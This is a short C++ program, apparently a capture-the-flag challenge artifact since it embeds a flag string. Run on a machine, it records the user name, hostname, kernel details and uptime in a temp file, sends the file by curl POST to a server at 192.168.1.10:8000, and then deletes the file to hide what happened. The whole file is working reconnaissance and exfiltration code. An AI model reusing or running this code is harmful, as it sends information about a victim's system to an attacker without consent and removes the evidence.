#include <bits/stdc++.h>
#include<string>

using namespace std;

int main(){
	string specialVariable="dc9111{D0cK3r_loGs_F7W!}";
	system("whoami >> /tmp/recon.txt");
	system("hostname >> /tmp/recon.txt");
	system("uname -a >> /tmp/recon.txt");
	system("uptime >> /tmp/recon.txt");
	system("curl -i -X POST -F \"data=@/tmp/recon.txt\" http://192.168.1.10:8000");
	system("rm /tmp/recon.txt");
	return 0;
}